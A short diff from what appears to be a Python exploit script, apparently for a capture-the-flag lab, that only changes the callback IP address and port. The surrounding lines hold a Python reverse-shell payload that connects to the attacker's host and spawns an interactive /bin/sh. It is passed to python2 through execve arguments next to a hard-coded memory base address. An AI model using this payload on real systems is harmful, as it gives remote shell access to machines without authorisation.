@@ -665,8 +665,8 @@ import base64
 import struct
 
 # Set constants
-ip = '10.10.14.14'
-port = 443
+ip = '10.10.16.22'
+port = 9001
 shell = f'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\0'.encode()
 execve_args = [b'/usr/local/bin/python2\0', b'-c\0', shell]
 base_addr = 0x6010c0
